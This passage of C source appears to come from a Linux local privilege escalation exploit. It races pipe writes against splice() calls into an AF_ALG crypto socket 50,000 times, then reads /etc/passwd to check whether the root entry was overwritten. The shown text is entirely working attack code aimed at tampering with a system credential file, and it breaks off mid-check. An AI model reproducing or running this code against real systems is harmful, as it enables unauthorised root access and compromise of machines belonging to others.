    race_go = 1;
    for (int i = 0; i < 50000; i++) {
        write(pipe_fds[1], buf, target_len);
        splice(pipe_fds[0], NULL, alg_op_fd, NULL, target_len, SPLICE_F_NONBLOCK);
    }

    pthread_join(t, NULL);
    close(alg_op_fd);
    close(alg_fd);
    close(pipe_fds[0]);
    close(pipe_fds[1]);

    // Check if passwd was modified
    FILE *f = fopen("/etc/passwd", "r");
    char line[256];
    while (fgets(line, sizeof(line), f)) {
        if (strncmp(line, "root:", 5) == 0) {
